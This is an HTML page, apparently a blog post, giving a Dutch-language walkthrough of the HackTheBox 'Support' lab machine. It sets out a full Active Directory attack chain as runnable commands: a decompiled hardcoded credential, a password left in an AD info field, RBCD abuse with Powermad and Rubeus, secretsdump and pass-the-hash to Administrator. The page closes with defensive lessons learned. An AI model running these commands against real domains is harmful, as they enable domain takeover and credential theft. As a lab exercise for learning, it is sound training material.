@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en" id="html-root">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Support — HackTheBox CTF Writeup | CyberStefan</title>
+  <meta name="description" content="HackTheBox — Support (Easy) Writeup In deze write up lopen we stap voor stap door de Support machine van HackTheBox. We beginnen helemaal bij het begin:…">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="CyberStefan">
+  <meta property="og:title" content="Support CTF Writeup — CyberStefan">
+  <meta property="og:description" content="HackTheBox — Support (Easy) Writeup In deze write up lopen we stap voor stap door de Support machine van HackTheBox. We beginnen helemaal bij het begin:…">
+  <meta property="og:url" content="https://cyberstefan.nl/writeup/support/">
+  <meta property="og:image" content="https://cyberstefan.nl/assets/cyberstefan-icon.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Support CTF Writeup — CyberStefan">
+  <meta name="twitter:description" content="HackTheBox — Support (Easy) Writeup In deze write up lopen we stap voor stap door de Support machine van HackTheBox. We beginnen helemaal bij het begin:…">
+  <meta name="twitter:image" content="https://cyberstefan.nl/assets/cyberstefan-icon.png">
+  <link rel="canonical" href="https://cyberstefan.nl/writeup/support/">
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="192x192" href="/favicon.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/assets/style.css">
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Support — HackTheBox CTF Writeup", "description": "HackTheBox — Support (Easy) Writeup In deze write up lopen we stap voor stap door de Support machine van HackTheBox. We beginnen helemaal bij het begin:…", "author": {"@type": "Person", "name": "CyberStefan", "url": "https://cyberstefan.nl"}, "publisher": {"@type": "Organization", "name": "CyberStefan", "url": "https://cyberstefan.nl"}, "datePublished": "2026-04-30", "dateModified": "2026-04-30", "keywords": "AD, LDAP, RBCD, Kerberos, Windows, Privesc, .NET, SMB, HackTheBox, Easy, CTF, writeup, ethical hacking", "articleSection": "CTF Writeup", "url": "https://cyberstefan.nl/writeup/support/", "inLanguage": ["en", "nl"], "image": "https://cyberstefan.nl/assets/cyberstefan-icon.png"}</script>
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "BreadcrumbList", "itemListElement": [{"@type": "ListItem", "position": 1, "name": "Home", "item": "https://cyberstefan.nl/"}, {"@type": "ListItem", "position": 2, "name": "Support Writeup", "item": "https://cyberstefan.nl/writeup/support/"}]}</script>
+</head>
+<body>
+
+<header>
+  <div class="container header-inner">
+    <div style="display:flex;align-items:center;gap:20px">
+      <div class="social-links">
+        <a href="https://www.instagram.com/cyberstefan.nl/" target="_blank" rel="noopener" class="social-icon" title="Instagram">
+          <svg viewBox="0 0 24 24" fill="currentColor" width="20" height="20"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838a6.162 6.162 0 1 0 0 12.324 6.162 6.162 0 0 0 0-12.324zM12 16a4 4 0 1 1 0-8 4 4 0 0 1 0 8zm6.406-11.845a1.44 1.44 0 1 0 0 2.881 1.44 1.44 0 0 0 0-2.881z"/></svg>
+        </a>
+      </div>
+      <a href="/" class="logo">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="2" y="3" width="20" height="14" rx="2"/>
+          <path d="m8 21 4-4 4 4"/><path d="M7 7h.01"/><path d="M11 7h6"/><path d="M7 11h.01"/><path d="M11 11h6"/>
+        </svg>
+        CTF Writeups
+      </a>
+      <a href="/blog" style="color:var(--text-muted,#8b949e);font-size:.85rem;text-decoration:none;transition:color .15s" onmouseover="this.style.color='#e6edf3'" onmouseout="this.style.color='#8b949e'">Blog</a>
+      <a href="/resources/" style="color:var(--text-muted,#8b949e);font-size:.85rem;text-decoration:none;transition:color .15s" onmouseover="this.style.color='#e6edf3'" onmouseout="this.style.color='#8b949e'">Resources</a>
+    </div>
+    <div style="display:flex;align-items:center;gap:16px">
+      <div class="lang-flags-header">
+        <button class="lang-flag-btn" data-lang="nl" title="Nederlands">
+          <svg class="flag-svg-sm" viewBox="0 0 900 600"><rect width="900" height="600" fill="#21468B"/><rect width="900" height="400" fill="#fff"/><rect width="900" height="200" fill="#AE1C28"/></svg>
+          <span class="lang-switch-code">NL</span>
+        </button>
+        <button class="lang-flag-btn" data-lang="en" title="English">
+          <svg class="flag-svg-sm" viewBox="0 0 60 30"><rect width="60" height="30" fill="#012169"/><path d="M0,0 L60,30 M60,0 L0,30" stroke="#fff" stroke-width="6"/><path d="M0,0 L60,30 M60,0 L0,30" stroke="#C8102E" stroke-width="4"/><path d="M30,0 V30 M0,15 H60" stroke="#fff" stroke-width="10"/><path d="M30,0 V30 M0,15 H60" stroke="#C8102E" stroke-width="6"/></svg>
+          <span class="lang-switch-code">EN</span>
+        </button>
+      </div>
+    </div>
+  </div>
+</header>
+
+<main class="container">
+  <a href="/" class="back-link">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
+    <span class="lang-en">All writeups</span><span class="lang-nl" hidden>Alle writeups</span>
+  </a>
+
+  <div class="writeup-header">
+    <h1 class="writeup-title">Support</h1>
+    <div class="writeup-meta">
+      <span class="badge badge-difficulty-Easy">Easy</span>
+      <span class="badge badge-platform-HackTheBox">HackTheBox</span>
+      <span class="badge" style="color:var(--muted);border-color:var(--border)">Completed</span>
+    </div>
+    <div class="writeup-tags"><span class="badge badge-tag">AD</span><span class="badge badge-tag">LDAP</span><span class="badge badge-tag">RBCD</span><span class="badge badge-tag">Kerberos</span><span class="badge badge-tag">Windows</span><span class="badge badge-tag">Privesc</span><span class="badge badge-tag">.NET</span><span class="badge badge-tag">SMB</span></div>
+    <p class="writeup-date" style="margin-top:10px">
+      <span class="lang-en">30 April 2026</span>
+      <span class="lang-nl" hidden>30 april 2026</span>
+    </p>
+  </div>
+
+  <div class="writeup-body lang-en"><h2>HackTheBox — Support (Easy) Writeup</h2>
+<p>In deze write-up lopen we stap voor stap door de Support machine van HackTheBox. We beginnen helemaal bij het begin: van het scannen van de machine tot het verkrijgen van administrator-toegang. Elk commando wordt uitgelegd zodat je begrijpt <strong>waarom</strong> je het uitvoert, niet alleen <strong>wat</strong> je uitvoert.</p>
+<p>---</p>
+<h2>Benodigde tools</h2>
+<p>Zorg dat je de volgende tools hebt voor je begint:</p>
+<p>| Tool | Waarvoor | Installatie |<br>|------|----------|-------------|<br>| nmap | Poorten scannen | <code>sudo apt install nmap</code> |<br>| smbclient | SMB shares benaderen | <code>sudo apt install smbclient</code> |<br>| ILSpy | .NET binaries decompileren | Zie stap 2 |<br>| ldapsearch | LDAP queries uitvoeren | <code>sudo apt install ldap-utils</code> |<br>| evil-winrm | Windows shell via WinRM | <code>sudo gem install evil-winrm</code> |<br>| PowerView.ps1 | AD enumeration in PowerShell | Zie stap 7 |<br>| Powermad.ps1 | Machine accounts aanmaken | Zie stap 9 |<br>| Rubeus.exe | Kerberos ticket manipulatie | Zie stap 10 |<br>| impacket | Kerberos tickets op Linux | <code>pip install impacket</code> |</p>
+<p>---</p>
+<h2>Stap 1 — Verkenning: Wat draait er op de machine?</h2>
+<p>Als eerste willen we weten welke poorten en services er open staan. Dit doen we met <strong>nmap</strong>.</p>
+<pre><code>nmap -sC -sV -oN support.nmap 10.129.43.78</code></pre>
+<p><strong>Uitleg van de flags:</strong><br><ul><li><code>-sC</code> — voer standaard scripts uit (extra info over services)</li><li><code>-sV</code> — detecteer versienummers van services</li><li><code>-oN support.nmap</code> — sla de output op in een bestand</li></ul><br>Relevante open poorten:</p>
+<p>| Poort | Service | Wat betekent dit? |<br>|-------|---------|-------------------|<br>| 139/445 | SMB | Gedeelde bestanden/mappen |<br>| 389 | LDAP | Active Directory query service |<br>| 5985 | WinRM | Windows Remote Management — hiermee krijgen we later een shell |</p>
+<p>De meest interessante poorten zijn <strong>SMB (445)</strong> en <strong>WinRM (5985)</strong>.</p>
+<p>---</p>
+<h2>Stap 2 — SMB Enumeration: Zijn er gedeelde mappen?</h2>
+<p><strong>SMB (Server Message Block)</strong> is een protocol waarmee Windows bestanden en mappen deelt over een netwerk. Soms zijn deze mappen publiek toegankelijk zonder wachtwoord.</p>
+<p>We bekijken welke shares er beschikbaar zijn:</p>
+<pre><code>smbclient -L //10.129.43.78 -N</code></pre>
+<p><strong>Uitleg:</strong><br><ul><li><code>-L</code> — toon een lijst van alle shares</li><li><code>-N</code> — probeer zonder wachtwoord (null session)</li></ul><br>We zien een share genaamd <code>support-tools</code>. Verbinding maken:</p>
+<pre><code>smbclient //10.129.43.78/support-tools -N</code></pre>
+<p>In de SMB shell:<br><pre><code>smb: &gt; ls<br>  UserInfo.exe.zip</code></pre></p>
+<p>Download het bestand:<br><pre><code>smb: &gt; get UserInfo.exe.zip<br>smb: &gt; exit</code></pre></p>
+<p>Uitpakken:<br><pre><code>unzip UserInfo.exe.zip</code></pre></p>
+<p>---</p>
+<h2>Stap 3 — ILSpy installeren op Linux</h2>
+<p><strong>UserInfo.exe</strong> is een .NET applicatie. .NET applicaties kunnen volledig worden terugvertaald naar leesbare broncode met <strong>ILSpy</strong>. Dit is iets wat veel developers niet weten: compiled .NET code is niet echt &quot;verborgen&quot;.</p>
+<p><strong>Download ILSpy:</strong><br><pre><code>cd ~/Downloads<br>wget https://github.com/icsharpcode/ILSpy/releases/latest/download/ILSpy-linux-x64-Release.zip<br>unzip ILSpy-linux-x64-Release.zip -d ILSpy<br>cd ILSpy &amp;&amp; ./ILSpy</code></pre></p>
+<p><strong>UserInfo.exe decompileren in ILSpy:</strong><br>1. Klik op <strong>File → Open</strong> en selecteer <code>UserInfo.exe</code><br>2. Navigeer in de boomstructuur links naar: <code>UserInfo → UserInfo.Services → Protected</code></p>
+<p>Je ziet nu de broncode van de <code>Protected</code> class:</p>
+<pre><code>private static string enc_password = &quot;&lt;ENC_PASSWORD_BASE64&gt;&quot;;
+private static byte[] key = Encoding.ASCII.GetBytes(&quot;armando&quot;);
+<p>public static string getPassword()<br>{<br>    byte[] array = Convert.FromBase64String(enc_password);<br>    for (int i = 0; i &lt; array.Length; i++)<br>    {<br>        array[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);<br>    }<br>    return Encoding.Default.GetString(array);<br>}</code></pre></p>
+<p>Er is een <strong>versleuteld wachtwoord</strong> dat via XOR wordt ontsleuteld. In de <code>LdapQuery</code> class zien we hoe het gebruikt wordt:</p>
+<pre><code>entry = new DirectoryEntry(&quot;LDAP://support.htb&quot;, &quot;support\ldap&quot;, password);</code></pre>
+<p>De applicatie verbindt met LDAP als gebruiker <code>ldap</code> met dit wachtwoord.</p>
+<p>---</p>
+<h2>Stap 4 — Wachtwoord ontsleutelen met Python</h2>
+<p>We schrijven een Python script dat dezelfde XOR-bewerking uitvoert als de C# code:</p>
+<pre><code>import base64
+<p>enc_password = &quot;&lt;ENC_PASSWORD_BASE64&gt;&quot;<br>key = b&quot;armando&quot;</p>
+<p>array = base64.b64decode(enc_password)<br>result = []<br>for i in range(len(array)):<br>    result.append((array[i] ^ key[i % len(key)]) ^ 0xDF)</p>
+<p>print(bytes(result).decode())<br><h2>Output: &lt;LDAP_PASSWORD&gt;</code></pre></h2></p>
+<p>Sla op als <code>decrypt.py</code> en voer uit:<br><pre><code>python3 decrypt.py</code></pre></p>
+<p><strong>Veelgemaakte fout:</strong> Het wachtwoord bevat <code>$</code> tekens. Als je dit typt in een bash commando met <strong>dubbele quotes</strong> (<code>&quot;...&quot;</code>), interpreteert bash de <code>$</code> als een variabele en vervangt die door een lege string. Gebruik altijd <strong>enkele quotes</strong> (<code>&#x27;...&#x27;</code>) voor wachtwoorden met speciale tekens.</p>
+<p>We hebben nu:<br><ul><li><strong>Gebruiker:</strong> <code>ldap@support.htb</code></li><li><strong>Wachtwoord:</strong> <code>&lt;LDAP_PASSWORD&gt;</code></li></ul><br>---</p>
+<h2>Stap 5 — LDAP Enumeration: Meer informatie ophalen</h2>
+<p><strong>LDAP (Lightweight Directory Access Protocol)</strong> is de taal waarmee je informatie uit Active Directory opvraagt. Met de gevonden credentials kunnen we nu alle gebruikers en hun eigenschappen opvragen.</p>
+<pre><code>ldapsearch -x -H ldap://10.129.43.78 -D &quot;ldap@support.htb&quot; -w &#x27;&lt;LDAP_PASSWORD&gt;&#x27; -b &quot;DC=support,DC=htb&quot; &quot;(sAMAccountName=support)&quot;</code></pre>
+<p><strong>Uitleg:</strong><br><ul><li><code>-x</code> — gebruik eenvoudige authenticatie</li><li><code>-H ldap://...</code> — het adres van de LDAP server</li><li><code>-D</code> — de gebruiker waarmee je inlogt</li><li><code>-w</code> — het wachtwoord (let op de enkele quotes!)</li><li><code>-b &quot;DC=support,DC=htb&quot;</code> — zoek in het hele domein</li><li><code>&quot;(sAMAccountName=support)&quot;</code> — filter op de gebruiker <code>support</code></li></ul><br>In de output vinden we:<br><pre><code>info: &lt;SUPPORT_PASSWORD&gt;</code></pre></p>
+<p>Iemand heeft het wachtwoord van de <code>support</code> gebruiker opgeslagen in het <strong>info-veld</strong> van het AD-account. Dit veld is leesbaar voor elke authenticated LDAP gebruiker — een ernstige beveiligingsfout.</p>
+<p>We hebben nu:<br><ul><li><strong>Gebruiker:</strong> <code>support</code></li><li><strong>Wachtwoord:</strong> <code>&lt;SUPPORT_PASSWORD&gt;</code></li></ul><br>---</p>
+<h2>Stap 6 — Eerste toegang via WinRM</h2>
+<p><strong>WinRM (Windows Remote Management)</strong> laat je een PowerShell shell openen op een Windows machine. De tool <code>evil-winrm</code> maakt dit eenvoudig vanuit Linux.</p>
+<p>Installeren als je het nog niet hebt:<br><pre><code>sudo gem install evil-winrm</code></pre></p>
+<p>Verbinding maken:<br><pre><code>evil-winrm -i 10.129.43.78 -u support -p &#x27;&lt;SUPPORT_PASSWORD&gt;&#x27;</code></pre></p>
+<p>Je hebt nu een PowerShell shell. Haal de user flag op:<br><pre><code>type C:\Users\support\Desktop\user.txt</code></pre></p>
+<p>---</p>
+<h2>Stap 7 — Post-exploitation: Wie ben ik en wat kan ik?</h2>
+<p>Nadat je toegang hebt, is de eerste vraag altijd: <strong>wie ben ik en welke rechten heb ik?</strong></p>
+<pre><code>whoami /all</code></pre>
+<p>Twee belangrijke dingen in de output:</p>
+<p><strong>Groepslidmaatschap:</strong><br><pre><code>SUPPORT\Shared Support Accounts</code></pre></p>
+<p><strong>Privilege:</strong><br><pre><code>SeMachineAccountPrivilege   Add workstations to domain   Enabled</code></pre></p>
+<p><code>SeMachineAccountPrivilege</code> betekent dat we <strong>computer-accounts mogen aanmaken</strong> in het domein. Dit klinkt onschuldig, maar in combinatie met wat we straks ontdekken is het gevaarlijk.</p>
+<p>---</p>
+<h2>Stap 8 — PowerView: AD rechten bekijken</h2>
+<p><strong>PowerView</strong> is een PowerShell script voor Active Directory enumeration.</p>
+<p><strong>Download op je Kali machine:</strong><br><pre><code>wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</code></pre></p>
+<p><strong>Upload via evil-winrm:</strong><br><pre><code>upload /pad/naar/PowerView.ps1</code></pre></p>
+<p><strong>Laden in PowerShell:</strong><br><pre><code>. .\PowerView.ps1</code></pre></p>
+<p>&gt; De punt (<code>.</code>) met een spatie ervoor betekent &quot;importeer alle functies uit dit script in de huidige sessie&quot;. Zonder de punt zijn de functies na het uitvoeren niet beschikbaar.</p>
+<p><strong>Verifieer dat het werkt:</strong><br><pre><code>Get-NetUser support</code></pre></p>
+<p><strong>Bekijk de ACL&#x27;s van de Domain Controller:</strong><br><pre><code>Get-DomainObjectAcl -Identity &quot;DC$&quot; -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -match &quot;1103&quot;}</code></pre></p>
+<p>&gt; We filteren op <code>1103</code> — het laatste deel van de SID van <code>Shared Support Accounts</code>. ACL (Access Control List) bepaalt wat een object mag doen met een ander object.</p>
+<p>De output toont:<br><pre><code>ActiveDirectoryRights : GenericAll</code></pre></p>
+<p><strong><code>GenericAll</code></strong> is het hoogste privilege over een AD-object: volledige controle. Onze groep heeft dit over de <strong>Domain Controller zelf</strong>.</p>
+<p>---</p>
+<h2>Stap 9 — Powermad: Fake machine account aanmaken</h2>
+<p><strong>RBCD (Resource-Based Constrained Delegation)</strong> laat een computer-account inloggen als een andere gebruiker bij een specifieke service. Normaal is dit voor legitieme scenario&#x27;s, maar met <code>GenericAll</code> over de DC kunnen we dit misbruiken.</p>
+<p><strong>Aanvalsstappen:</strong><br>1. Maak een computer-account aan dat jij controleert<br>2. Vertel de DC: vertrouw dit account om anderen te impersonaten<br>3. Vraag een Kerberos ticket aan als Administrator<br>4. Gebruik dat ticket om toegang te krijgen</p>
+<p><strong>Download Powermad op je Kali machine:</strong><br><pre><code>wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1</code></pre></p>
+<p><strong>Upload en laden:</strong><br><pre><code>upload /pad/naar/Powermad.ps1<br>. .\Powermad.ps1</code></pre></p>
+<p><strong>Nieuw machine account aanmaken:</strong><br><pre><code>New-MachineAccount -MachineAccount &quot;FakeComputer&quot; -Password $(ConvertTo-SecureString &#x27;Password123!&#x27; -AsPlainText -Force)</code></pre></p>
+<p><strong>SID ophalen:</strong><br><pre><code>Get-NetComputer FakeComputer | Select-Object -ExpandProperty objectsid</code></pre></p>
+<p>Noteer de SID — je hebt hem nodig in de volgende stap.</p>
+<p><strong>RBCD instellen op de DC (voer elke regel apart in):</strong><br><pre><code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;JOUW-SID-HIER)&quot;<br>$SDBytes = New-Object byte[] ($SD.BinaryLength)<br>$SD.GetBinaryForm($SDBytes, 0)<br>Get-DomainComputer DC | Set-DomainObject -Set @{&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes}</code></pre></p>
+<p>&gt; Voer elke regel <strong>apart</strong> in — als je ze samenplakt gaat PowerShell in de fout.</p>
+<p>---</p>
+<h2>Stap 10 — Rubeus: Kerberos ticket aanvragen</h2>
+<p><strong>Download Rubeus (pre-compiled binary):</strong><br><pre><code>wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe</code></pre></p>
+<p><strong>Upload:</strong><br><pre><code>upload /pad/naar/Rubeus.exe</code></pre></p>
+<p><strong>NTLM hash berekenen van het wachtwoord van FakeComputer:</strong></p>
+<p>Rubeus heeft de NTLM hash nodig, niet het wachtwoord zelf. Bereken dit op je Kali machine:</p>
+<pre><code>python3 -c &quot;import hashlib,binascii; print(binascii.hexlify(hashlib.new(&#x27;md4&#x27;,&#x27;Password123!&#x27;.encode(&#x27;utf-16le&#x27;)).digest()).decode())&quot;
+<h2>Output: &lt;FAKECOMPUTER_NTLM_HASH&gt;</code></pre></h2>
+<p><strong>Ticket genereren:</strong><br><pre><code>.\Rubeus.exe s4u /user:FakeComputer$ /rc4:&lt;FAKECOMPUTER_NTLM_HASH&gt; /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /nowrap</code></pre></p>
+<p>Kopieer de laatste base64-string uit de output (het langste blok onderaan, voor <code>cifs/dc.support.htb</code>).</p>
+<p>---</p>
+<h2>Stap 11 — Ticket gebruiken met Impacket</h2>
+<p><strong>Belangrijk:</strong> Evil-WinRM sessies kunnen Kerberos tickets die via Rubeus zijn geïmporteerd niet gebruiken voor SMB. We gebruiken het ticket op onze eigen Kali machine met impacket.</p>
+<p><strong>Base64 decoderen naar binair bestand:</strong><br><pre><code>echo &quot;JOUW_BASE64_HIER&quot; &gt; /tmp/ticket.b64<br>base64 -d /tmp/ticket.b64 &gt; /tmp/ticket.kirbi</code></pre></p>
+<p><strong>Converteren van Windows-formaat (.kirbi) naar Linux-formaat (.ccache):</strong><br><pre><code>impacket-ticketConverter /tmp/ticket.kirbi /tmp/admin.ccache</code></pre></p>
+<p><strong>Ticket activeren:</strong><br><pre><code>export KRB5CCNAME=/tmp/admin.ccache</code></pre></p>
+<p><strong>Administrator hashes dumpen:</strong><br><pre><code>impacket-secretsdump -k -no-pass dc.support.htb</code></pre></p>
+<p>Output:<br><pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;ADMIN_NTLM_HASH&gt;:::</code></pre></p>
+<p>Het deel na de derde dubbele punt (<code>bb06cbc02b39...</code>) is de <strong>NTLM hash</strong> van de Administrator.</p>
+<p>---</p>
+<h2>Stap 12 — Root shell via Pass-the-Hash</h2>
+<p><strong>Pass-the-Hash</strong> is een techniek waarbij je een NTLM hash gebruikt om in te loggen zonder het wachtwoord te kennen. Windows authenticatie accepteert de hash direct.</p>
+<pre><code>evil-winrm -i 10.129.43.78 -u Administrator -H &lt;ADMIN_NTLM_HASH&gt;</code></pre>
+<p>Root flag ophalen:<br><pre><code>type C:\Users\Administrator\Desktop\root.txt</code></pre></p>
+<p>---</p>
+<h2>Overzicht van de aanvalsketen</h2>
+<pre><code>SMB share (anoniem toegankelijk)
+    → UserInfo.exe.zip downloaden
+    → ILSpy decompilatie van .NET binary
+    → XOR-encrypted LDAP wachtwoord gevonden
+    → LDAP query als ldap user
+    → Wachtwoord gevonden in info-veld van support user
+    → evil-winrm shell als support (user.txt)
+    → whoami /all: SeMachineAccountPrivilege + Shared Support Accounts
+    → PowerView: GenericAll van die groep over de DC
+    → Powermad: FakeComputer machine account aanmaken
+    → RBCD instellen op de DC via msds-allowedtoactonbehalfofotheridentity
+    → Rubeus: S4U Kerberos ticket als Administrator
+    → impacket-ticketConverter + secretsdump: Admin NTLM hash
+    → evil-winrm Pass-the-Hash: Administrator shell (root.txt)</code></pre>
+<p>---</p>
+<h2>Lessons Learned</h2>
+<p>1. <strong>.NET code is niet &#x27;compiled&#x27; in de traditionele zin</strong> — ILSpy decomplileert het volledig terug naar leesbare C# code. Sla nooit credentials op in een .NET applicatie, ook niet versleuteld.</p>
+<p>2. <strong>AD info-veld is publiek leesbaar</strong> — Elk veld in een AD gebruikersprofiel is leesbaar voor alle authenticated gebruikers in het domein. Gebruik het nooit voor wachtwoorden.</p>
+<p>3. <strong>GenericAll over een computer-object = domain compromise</strong> — Beperk altijd welke groepen volledige rechten hebben over computer-objecten, zeker over Domain Controllers.</p>
+<p>4. <strong>SeMachineAccountPrivilege is gevaarlijker dan het lijkt</strong> — Gecombineerd met GenericAll over een computer is dit genoeg voor een volledige domain takeover via RBCD.</p>
+<p>5. <strong>$ tekens in wachtwoorden</strong> — Gebruik altijd enkele quotes in bash als een wachtwoord speciale tekens bevat.</p>
+<p>6. <strong>Evil-WinRM en Kerberos tickets</strong> — Tickets die via Rubeus /ptt worden geïmporteerd in een WinRM-sessie werken niet voor SMB. Gebruik impacket op je eigen machine.</p>
+<p>7. <strong>Machine accounts kunnen verdwijnen</strong> — HTB reset machines periodiek, waardoor aangemaakt accounts verdwijnen. Maak bij een nieuwe sessie een nieuw account aan.</p></div>
+
+  <div style="margin-top:32px;padding:18px 20px;background:#161b22;border:1px solid #30363d;border-radius:10px;display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap">
+    <span class="lang-en" style="font-size:.9rem;color:#cdd9e5">Want to try this CTF challenge yourself?</span>
+    <span class="lang-nl" hidden style="font-size:.9rem;color:#cdd9e5">Wil je deze CTF ook proberen?</span>
+    <a href="https://hacktheboxltd.sjv.io/enroEz" target="_blank" rel="noopener sponsored" style="display:inline-flex;align-items:center;gap:6px;background:#58a6ff;color:#0d1117;font-size:.82rem;font-weight:600;padding:8px 16px;border-radius:6px;text-decoration:none;white-space:nowrap">
+      <span class="lang-en">Click here</span><span class="lang-nl" hidden>Ga dan hier naartoe</span>
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+    </a>
+  </div>
+
+  <div style="margin-top:12px;padding:14px 18px;background:#0d1117;border:1px solid #21262d;border-radius:8px;display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap">
+    <span class="lang-en" style="font-size:.82rem;color:#6e7681">🔒 Protect your IP while hacking — use a VPN</span>
+    <span class="lang-nl" hidden style="font-size:.82rem;color:#6e7681">🔒 Bescherm je IP tijdens het hacken — gebruik een VPN</span>
+    <a href="https://go.nordvpn.net/aff_c?offer_id=15&amp;aff_id=146180&amp;url_id=902" target="_blank" rel="noopener sponsored" style="font-size:.78rem;color:#58a6ff;text-decoration:none;white-space:nowrap;flex-shrink:0">NordVPN →</a>
+  </div>
+</main>
+
+<footer>
+  <div class="container" id="footer-text">
+    <span class="lang-en">Built with FastAPI &amp; SQLite &mdash; automated via <code>ctf-writeup</code> CLI</span>
+    <span class="lang-nl" hidden>Gebouwd met FastAPI &amp; SQLite &mdash; geautomatiseerd via <code>ctf-writeup</code> CLI</span>
+  </div>
+</footer>
+
+<script>
+(function () {
+  var l = localStorage.getItem('lang') || 'en';
+  document.documentElement.lang = l;
+  if (l === 'nl') {
+    document.querySelectorAll('.lang-en').forEach(function(e){e.hidden=true;});
+    document.querySelectorAll('.lang-nl').forEach(function(e){e.hidden=false;});
+  }
+  document.querySelectorAll('.lang-flag-btn').forEach(function(btn){
+    btn.classList.toggle('active', btn.dataset.lang === l);
+    btn.addEventListener('click', function(){
+      var nl = btn.dataset.lang;
+      localStorage.setItem('lang', nl);
+      document.documentElement.lang = nl;
+      document.querySelectorAll('.lang-flag-btn').forEach(function(b){
+        b.classList.toggle('active', b.dataset.lang === nl);
+      });
+      document.querySelectorAll('.lang-en').forEach(function(e){e.hidden=(nl!=='en');});
+      document.querySelectorAll('.lang-nl').forEach(function(e){e.hidden=(nl!=='nl');});
+    });
+  });
+})();
+</script>
+</body>
+</html>
